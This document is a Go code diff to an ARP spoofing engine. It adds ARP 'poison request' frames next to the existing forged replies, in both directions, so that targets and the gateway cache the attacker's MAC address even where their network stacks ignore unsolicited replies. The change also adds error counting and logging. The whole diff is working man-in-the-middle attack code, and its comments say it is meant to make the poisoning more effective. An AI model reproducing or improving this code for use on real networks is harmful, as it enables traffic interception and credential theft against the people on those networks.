@@ -2,8 +2,10 @@ package engine
 
 import (
 	"context"
+	"log"
 	"net"
 	"sync"
+	"sync/atomic"
 	"time"
 )
 
@@ -24,8 +26,17 @@ const defaultSpoofInterval = time.Second
 type Spoofer struct {
 	handle Handle
 
-	mu  sync.Mutex
-	cfg SpoofConfig
+	mu       sync.Mutex
+	cfg      SpoofConfig
+	sendErrs atomic.Uint64
+}
+
+func (s *Spoofer) send(frame []byte) {
+	if err := s.handle.Send(frame); err != nil {
+		if s.sendErrs.Add(1) == 1 {
+			log.Printf("spoof: ARP injection failed (will suppress further): %v", err)
+		}
+	}
 }
 
 func NewSpoofer(h Handle) *Spoofer {
@@ -87,14 +98,21 @@ func (s *Spoofer) poisonOnce() {
 	s.mu.Unlock()
 
 	for _, t := range cfg.Targets {
-		// Tell the target that the gateway lives at our MAC.
+		// Tell the target the gateway lives at our MAC, as both a reply and a request: some
+		// stacks ignore unsolicited replies but still cache the sender of a request.
 		if frame, err := BuildARPReply(cfg.GatewayIP, cfg.SelfMAC, t.IP, t.MAC); err == nil {
-			_ = s.handle.Send(frame)
+			s.send(frame)
 		}
-		// Full duplex also tells the gateway that the target lives at our MAC.
+		if frame, err := BuildPoisonRequest(cfg.GatewayIP, cfg.SelfMAC, t.IP, t.MAC); err == nil {
+			s.send(frame)
+		}
+		// Full duplex also tells the gateway the target lives at our MAC.
 		if cfg.FullDuplex {
 			if frame, err := BuildARPReply(t.IP, cfg.SelfMAC, cfg.GatewayIP, cfg.GatewayMAC); err == nil {
-				_ = s.handle.Send(frame)
+				s.send(frame)
+			}
+			if frame, err := BuildPoisonRequest(t.IP, cfg.SelfMAC, cfg.GatewayIP, cfg.GatewayMAC); err == nil {
+				s.send(frame)
 			}
 		}
 	}
